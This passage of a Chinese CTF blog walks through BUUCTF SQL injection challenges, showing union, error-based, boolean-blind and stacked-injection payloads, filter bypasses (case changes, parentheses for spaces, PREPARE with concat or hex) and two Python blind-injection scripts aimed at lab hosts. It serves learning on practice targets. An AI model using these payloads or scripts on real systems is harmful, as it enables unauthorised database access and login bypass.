class="hljs-built_in">print</span>(f,end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="BUU-SQL-COURSE"><a href="#BUU-SQL-COURSE" class="headerlink" title="BUU SQL COURSE"></a>BUU SQL COURSE</h1><p>登录未能注入成功，浏览器观察网络模块发现新闻点击时可能存在注入，所以复制 url 开始尝试</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/I4WhbD5rpoJ0qNx7zlJceNGhnme.png"></p><p><code>?id=1 and 1=1</code> 时仍是相同回显</p><p><code>?id=1 and 1=2</code> 时无回显，说明为数字型</p><p><code>?id=1 order by 2</code> 有正常回显，<code>?id=1 order by 3</code> 无，说明为 2 列</p><p><code>?id=-1 union select database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;</code> 即可得到数据库名、表名</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/IXUnb4AFSoT7jhxE2Wucs5UQnJe.png"></p><p>后续依次获取列名、内容即可</p><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>尝试判断闭合类型，结尾使用注释</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/WUQZbgFmrombgMxEdN2cbOhHnof.png"></p><p>在密码 123 处报错，说明密码的闭合方式为双引号且注释未生效，尝试 <code>1&#39; and 1=1 -- -</code></p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/QAJfbgSDFoVJ42x3kbucknkVnTb.png"></p><p>未出现如上报错，注释成功，未出现其他报错，闭合方式正确，输入 <code>1&#39; order by 5 -- -</code> 逐一尝试</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/FNAebYobGomIfrxSZdgcFa6Tnuf.png"></p><p><code>1&#39; order by 4 -- -</code> 时报错，<code>1&#39; order by 3 -- -</code> 未报错，说明 3 列</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/EzxjbooRXoIJgJxb4Ldcs7hgnb1.png"></p><p>输入 <code>1&#39; union select 1,2,3 -- -</code> 判断显示位置，直接结束。</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/JgCrb5IWGoabbixlF4LcIA3Fn5m.png"></p><p><strong>其实直接</strong> <code>1&#39; or 1=1 #</code> <strong>完事……</strong></p><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>输入 <code>1&#39; and 1=1 -- -</code>，显示 do not hack me 发现有过滤，多试几个就发现 and、or、&#x3D;均有过滤，尝试大小写成功绕过。</p><p>输入 <code>1&#39; Order By 3 -- -</code> 无报错，<code>1&#39; Order By 4 -- -</code> 报错，说明共三列</p><p>输入 <code>1&#39; union select 1,2,3 -- -</code> 仍为 wrong user，没发现回显位置</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/AFKxbgFwNo9rcdxYw7kcvwynnAf.png"></p><p>但是发现注释如下（原本就有之前没看到），base32+base64 解密可得明文</p><p><code>select * from user where username = &#39;$name&#39;</code></p><p>那么逻辑应该就是先根据用户名查找，然后再校验密码。</p><p>用户名直接输入 admin，存在该用户，返回 wrong pass</p><p>已知一个用户名后用 union select 去探测一下用户名所在列，输入 <code>1&#39; union select &#39;admin&#39;,2,3 -- -</code> 返回 wrong user，输入 <code>1&#39; union select 1,&#39;admin&#39;,3 -- -</code> 返回 wrong pass，说明用户名位于第二列，可以推测密码即第三列。</p><p>但是后面就不知道怎么搞了，只能去看源码，输入的密码 md5 加密后要与数据库第三列数据一致才能获得 flag。</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/QZ0AbwarKoF7Plx2DRxcfaYknHh.png"></p><p>网上搜索了一下，发现 union 联合查询时如果查询的数据不存在，就会构建一个虚拟的数据，可能这也是为什么 <code>1&#39; union select 1,2,3 -- -</code> 可以探测回显位置，1<del>3 在表内原本不存在，union 查询后先构造了虚拟的 1</del>3 的数据，然后再读取返回到有回显的位置。</p><p>由于是先查询用户名再判断密码是否正确，所以本题可以利用 union 联合查询在用户名处注入，向密码列写入一个 md5 值，然后在密码处输入 md5 对应的明文，那么在查询完用户名后虚拟数据构造完成，判断密码时就将密码栏输入的内容 md5 加密后与虚拟数据的密码列内容比较，也就绕过了原本的密码。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">例如：                                  （<span class="hljs-number">123</span> md5后的结果）<br>用户：<span class="hljs-number">1</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-symbol">&#x27;admin</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">202</span>cb962ac59075b964b07152d234b70&#x27; <span class="hljs-comment">-- -</span><br>密码：<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>逐个尝试发现 and、&#x3D;、&gt;、&lt;、空格、union 均被过滤，双写及大小写均无法绕过，但是存在报错信息，考虑报错注入。</p><p>输入 <code>1&#39;&quot;</code> 报错，<code>use near &#39;&quot;&#39; and password=&#39;123&#39;&#39; at line 1</code>，所以单引号闭合</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/X4Tfb1kbboP7d7xO2FZcfjDrnLb.png"></p><p>输入 <code>1&#39;</code> 报错，输入 <code>1&#39;#</code> 不报错，<code>#</code> 成功注释</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/AJEFbUNbXoXesOx2ykQcF5q9npe.png"></p><p>因为空格被过滤，括号正常，所以可以套括号代替空格。<code>extractvalue()</code> 函数去触发报错，<code>concat()</code> 拼接一下内容。输入 <code>1&#39;or(extractvalue(1,concat(0x7e,database())))#</code>，成功得到数据库名。</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/UwYLbR2kooz1FJx4PMlcDWb8nIh.png"></p><p>这里注意整个 select 语句外面也要套一层括号，用 <code>like</code> 代替 <code>=</code> 继续输入 <code>1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)))))#</code>，获得表名。</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/QPlhbUB0totaT5xuGQWcgb42nDh.png"></p><p>稍作修改，继续输入 <code>1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)))))#</code>，获得列名。</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/Be9PbyEnAoovDnxikzQcsfb0nBc.png"></p><p>稍作修改，继续输入 <code>1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(username,0x7e,password))from(geek.H4rDsq1)))))#</code>，获得 username 和 password 列的内容。</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/Em56bWLD5oa4vxxfiFfcoaiinzx.png"></p><p>显示不完全，用 <code>substring(str,num1,num2)</code> 函数调整位置，结果发现这个也过滤了，换用 <code>right</code> 尝试 <code>1&#39;or(extractvalue(1,concat(0x7e,right((select(group_concat(username,0x7e,password))from(geek.H4rDsq1)),30))))#</code>，成功，拼接即得 flag。</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/UfYgb6VlWo2S67xoN8GctLwqn2g.png"></p><h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p>登录栏测了一下基本都过滤了，选择正确代码发现存在注入，但是 union、and、空格这些过滤了大部分，而且没有回显位，应该就是考布尔盲注。用 python 脚本二分法去跑结果</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import requests<br>import re<br>import <span class="hljs-built_in">time</span><br><br>url = <span class="hljs-string">&quot;http://df6d4f70-e3c4-46b8-86fb-7d59ae29eb14.node5.buuoj.cn:81/search.php?id=&quot;</span><br>x = <span class="hljs-number">7</span><br>payloads = [<br>    <span class="hljs-comment"># 库长 0</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 库名 1</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br>    <span class="hljs-comment"># 表长 2</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 表名 3</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br>    <span class="hljs-comment"># 列长 4</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 列名 5</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 内容 7</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span><br>]<br><br>method=<span class="hljs-number">0</span><br><br>keywords = <span class="hljs-string">&quot;ERROR&quot;</span><span class="hljs-comment">#&quot;Click others&quot;</span><br><br>def boolean_query(url,payload):<br>    <span class="hljs-keyword">if</span> method == <span class="hljs-number">0</span>:<br>        r = requests.<span class="hljs-built_in">get</span>(url + payload)<br>    elif method == <span class="hljs-number">1</span>:<br>        r = requests.<span class="hljs-built_in">post</span>(url, payload)<br>    elif method == <span class="hljs-number">2</span>:<br>        r = requests.<span class="hljs-built_in">post</span>(url, json=payload)<br>    <span class="hljs-literal">return</span> keywords <span class="hljs-keyword">in</span> r.<span class="hljs-keyword">text</span>  <span class="hljs-comment"># 这里判断页面是否存在关键字</span><br><br>def get_length(url,payload):<br>    <span class="hljs-keyword">if</span> payload == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-literal">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">if</span> boolean_query(url,payload):<br>            <span class="hljs-literal">return</span> i<br>    <span class="hljs-literal">return</span> <span class="hljs-number">0</span><br><br>def get_name(url,<span class="hljs-built_in">length</span>,payload):<br>    results=[]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">length</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">length</span> = <span class="hljs-number">400</span><br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">170</span>,<span class="hljs-built_in">length</span>+<span class="hljs-number">1</span>):<br>        low, high = <span class="hljs-number">32</span>, <span class="hljs-number">126</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2</span><br>            tmp_payload = payload.<span class="hljs-built_in">format</span>(i=i,<span class="hljs-keyword">mid</span>=<span class="hljs-keyword">mid</span>)<br>            <span class="hljs-keyword">if</span> boolean_query(url,tmp_payload):<br>                low = <span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = <span class="hljs-keyword">mid</span><br>        <span class="hljs-keyword">if</span> low == <span class="hljs-number">32</span>:  <span class="hljs-comment"># ASCII 32 = 空格，表示结束</span><br>            break<br>        name += chr(low)<br>        print(chr(low),<span class="hljs-keyword">end</span>=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-literal">return</span> name<br><br>payload = payloads[x]<br><span class="hljs-built_in">length</span> = get_length(url,payload)<br><span class="hljs-built_in">result</span> = get_name(url,<span class="hljs-built_in">length</span>,payload)<br>print(f<span class="hljs-string">&quot;\n[+] Found : &#123;result&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p>先跑所有数据库名</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/ZWFubIQemoP1duxlppvcvHzSnrd.png"></p><p>然后跑出 geek 库的表名</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/Uuffb5xTxo7EsbxoYWfc0iy7nRc.png"></p><p>然后跑出 geek 库 Flaaaaag 表的列名</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/Udu9bk5OcoclUxxS6BYcWykInmc.png"></p><p>然后发现被骗了</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/H6aYbClnJoIjYmxPEqUcs7gLnTg.png"></p><p>换 F1naI1y 表跑，大概就这样，内容部分有错误。</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/WQ3sb0fGRoDaZIxTsctc3Pz0n0K.png"></p><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>输入 1、2 均有结果，空格、+ 被过滤，发现 %20 可替代，and、or、union、information、(group、%20group、均过滤。</p><p>综合考虑，可以用 concat()代替 group_concat()，空格沿用前面一题的括号，information 可以改用 sys.schema_auto_increment_columns 查表，但是再一看题目已经给出 flag 所在表和列了，那就直接爆就好了。按我的注入语句来说，当 Hello, glzjin wants a girlfriend.出现的时候即判断正确，Error Occured When Fetch Result.出现即判断错误，其他即注入语句本身有误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://23f0fee2-b6ad-4a70-88b9-b13213bde7f9.node5.buuoj.cn:81/index.php&quot;</span><br><br>x = <span class="hljs-number">7</span><br>payloads = [<br>    <span class="hljs-comment"># 库长 0</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 库名 1</span><br>    <span class="hljs-string">&quot;0^(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br>    <span class="hljs-comment"># 表长 2</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 表名 3</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 列长 4</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 列名 5</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 内容 7</span><br>    <span class="hljs-string">&quot;0^(ascii(substr((select(concat(flag))from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span><br>]<br><br>method=<span class="hljs-number">1</span>               <span class="hljs-comment"># get:0  post+url:1  post+json:2</span><br>parameters_url=&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;        <span class="hljs-comment"># method=1</span><br>target_url=<span class="hljs-string">&quot;id&quot;</span>                 <span class="hljs-comment"># method=1</span><br>parameters_json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;      <span class="hljs-comment"># method=2</span><br>target_json=<span class="hljs-string">&quot;username&quot;</span>                             <span class="hljs-comment"># method=2</span><br><br>keywords = <span class="hljs-string">&quot;glzjin&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boolean_query</span>(<span class="hljs-params">url,payload</span>):<br>    <span class="hljs-keyword">if</span> method == <span class="hljs-number">0</span>:<br>        r = requests.get(url + payload)<br>    <span class="hljs-keyword">elif</span> method == <span class="hljs-number">1</span>:<br>        parameters_url[target_url] = payload<br>        r = requests.post(url, data=parameters_url)<br>    <span class="hljs-keyword">elif</span> method == <span class="hljs-number">2</span>:<br>        parameters_json[target_json]=payload<br>        r = requests.post(url, json=parameters_json)<br>    <span class="hljs-keyword">return</span> keywords <span class="hljs-keyword">in</span> r.text  <span class="hljs-comment"># 这里判断页面是否存在关键字</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>(<span class="hljs-params">url,payload</span>):<br>    <span class="hljs-keyword">if</span> payload == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">if</span> boolean_query(url,payload):<br>            <span class="hljs-keyword">return</span> i<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_name</span>(<span class="hljs-params">url,length,payload</span>):<br>    results=[]<br>    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span>:<br>        length = <span class="hljs-number">400</span><br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length+<span class="hljs-number">1</span>):<br>        low, high = <span class="hljs-number">32</span>, <span class="hljs-number">126</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            mid = (low + high) // <span class="hljs-number">2</span><br>            tmp_payload = payload.<span class="hljs-built_in">format</span>(i=i,mid=mid)<br>            <span class="hljs-keyword">if</span> boolean_query(url,tmp_payload):<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br>        <span class="hljs-keyword">if</span> low == <span class="hljs-number">32</span>:  <span class="hljs-comment"># ASCII 32 = 空格，表示结束</span><br>            <span class="hljs-keyword">break</span><br>        name += <span class="hljs-built_in">chr</span>(low)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(low),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">return</span> name<br><br>payload = payloads[x]<br>length = get_length(url,payload)<br>result = get_name(url,length,payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] Found : <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>一开始先查了数据库，后面发现没必要</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/SThibFGh1oDzufxI7Flcvf0hnAe.png"></p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/GyP3byDCsoSIwIxCzVhc7X5KnTg.png"></p><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>刚学，先用 BP 和相关字典 fuzz 一下，可以比较高效地探测哪些函数、关键字、符号不可用</p><p>例如本题当输入 <code>select</code> 时直接给出了过滤的范围，联合注入可以排除</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/Lan7bHQDHoQ3ZjxZfkuchz97nbd.png"></p><p>输入 <code>1 or 1=1</code> 时能正常回显</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/T2uWbq5ePoqP3mxBp8OcFk7JnSg.png"></p><p>输入 <code>1&#39; or &#39;1&#39;=&#39;1</code> 时同样正常</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/IYEpbtlTPoe8BJxOxUccDGYnnhp.png"></p><p>这个时候则会报错</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/W9kabh3tTo0Vzqx8uRbconPAn1e.png"></p><p>说明后面还有查询语句，以单引号闭合，所以后面还要补上注释符 <code>1&#39; or 1=1#</code>，此时显示了所有内容</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/H45dbqPdvoQqrqxcB9GcFtednRf.png"></p><p>接下来尝试堆叠注入，要避免直接使用 select 和 where，<code>1&#39;;show databases;#</code> 查看数据库</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/A7nFbsJaroJVDDxMSlkcrG6anXr.png"></p><p>继续查看表 <code>1&#39;;show tables;#</code></p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/HScpbJe1SofO5vxYmuvcMersn0d.png"></p><p>接下来查看列可以使用 <code>1&#39;; show columns from tableName;#</code> 或 <code>1&#39;;desc tableName;#</code>。注意，<u>如果 tableName 是纯数字，需要用反引号</u>&#96;&#96;&#96;<u>包裹</u>，所以输入 <code>1&#39;;desc </code> 1919810931114514 <code>;#</code></p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/EdW7blyC1oBOcGxwqCkcWCQrntg.png"></p><p>得到列名后想要获取具体内容一般都需要依靠 select 和 where，这里参考别人总结的四种方法学习尝试一下</p><h2 id="方法一：预编译-字符串拼接绕过"><a href="#方法一：预编译-字符串拼接绕过" class="headerlink" title="方法一：预编译 + 字符串拼接绕过"></a>方法一：预编译 + 字符串拼接绕过</h2><p>通过预编译的方式拼接 select 关键字：<code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from </code> 1919810931114514 <code> &#39;);EXECUTE hacker;#</code>。预编译相当于定一个语句相同，参数不同的 Mysql 模板，我们可以通过预编译的方式，绕过特定的字符过滤。之前有学习过通过预编译防御 SQL 注入攻击，但这是第一次用预编译来绕过防护。</p><p>预编译的格式如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> 名称 <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">Sql</span>语句 ? ;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@x</span><span class="hljs-operator">=</span>xx;<br><span class="hljs-keyword">EXECUTE</span> 名称 <span class="hljs-keyword">USING</span> <span class="hljs-variable">@x</span>;<br></code></pre></td></tr></table></figure><p>例如：正常查询使用 <code>SElECT * FROM t_user WHERE USER_ID = 1</code>，预编译则可以如下操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">方法一：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br><br>方法二：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@ID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXECUTE</span> jia <span class="hljs-keyword">USING</span> <span class="hljs-variable">@ID</span>;<br><br>方法三：<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@SQL</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@SQL</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br></code></pre></td></tr></table></figure><p>本题因为可以堆叠注入且过滤了 select 关键字，所以先将关键字拆开通过 concat 方法拼接并预编译，来绕过检测，然后再执行预编译好的查询语句获取 flag。</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/D3TEbhvlPopwvIxQkQ7cVK9gnzN.png"></p><h2 id="方法二：预编译-十六进制编码绕过"><a href="#方法二：预编译-十六进制编码绕过" class="headerlink" title="方法二：预编译 + 十六进制编码绕过"></a>方法二：预编译 + 十六进制编码绕过</h2><p>可以直接将 <code>select * from </code> 1919810931114514&#96;&#96; 语句进行 16 进制编码，即：<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>，替换 payload 预编译：</p><p><code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</code></p><p>基本原理同上</p><h2 id="方法三：handler-替换-select（仅-MySQL）"><a href="#方法三：handler-替换-select（仅-MySQL）" class="headerlink" title="方法三：handler 替换 select（仅 MySQL）"></a>方法三：handler 替换 select（仅 MySQL）</h2><p><code>1&#39;;HANDLER </code> 1919810931114514 <code>OPEN;HANDLER</code> 1919810931114514 <code>READ FIRST;HANDLER</code> 1919810931114514 <code> CLOSE;#</code> 直接获取 flag</p><p>mysql 除可使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过 handler 语句并不具备 select 语句的所有功能，并且是 mysql 专用的语句，并没有包含到 SQL 标准中。</p><p>handler 使用格式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">打开表：<br>HANDLER 表名 <span class="hljs-keyword">OPEN</span> ;<br><br>查看数据：<br>HANDLER 表名 READ 